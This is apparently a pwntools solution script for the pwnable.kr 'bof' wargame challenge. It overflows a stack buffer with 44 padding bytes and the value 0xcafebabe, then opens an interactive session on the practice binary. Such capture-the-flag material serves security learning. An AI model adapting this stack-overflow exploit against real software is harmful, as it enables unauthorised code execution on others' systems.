from pwn import *


r = process('./bof')
# r = remote('pwnable.kr', 9000)
r.readuntil('overflow me : ')
# 
payload = 'A'*44 + p32(0xcafebabe)
# payload = 'fdsfds'
r.sendline(payload)

r.interactive()

